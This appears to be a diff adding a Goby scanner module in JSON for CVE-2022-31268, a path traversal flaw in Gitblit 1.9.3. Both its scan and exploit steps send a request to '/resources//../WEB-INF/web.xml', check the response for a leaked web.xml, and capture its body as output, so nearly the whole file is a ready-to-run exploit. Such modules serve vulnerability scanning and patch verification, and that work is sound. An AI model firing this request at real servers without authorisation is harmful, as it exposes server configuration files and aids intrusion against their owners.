@@ -1,0 +1,111 @@
+{
+      "Name": "Gitblit 1.9.3 Path Traversal CVE-2022-31268",
+      "Level": "2",
+      "Tags": [
+            "Path Traversal"
+      ],
+      "GobyQuery": "product=\"Gitblit\"",
+      "Description": "Gitblit is an open-source, pure Java stack for managing, viewing, and serving Git repositories.",
+      "Product": "Gitblit",
+      "Homepage": "https://gitblit.github.io/gitblit",
+      "Author": "",
+      "Impact": "A Path Traversal vulnerability in Gitblit 1.9.3 can lead to reading website files via /resources//../ (e.g., followed by a WEB-INF or META-INF pathname).",
+      "Recommendation": "https://gitblit.github.io/gitblit",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-31268"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/resources//../WEB-INF/web.xml",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "xml",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "web-app",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/resources//../WEB-INF/web.xml",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "xml",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "web-app",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
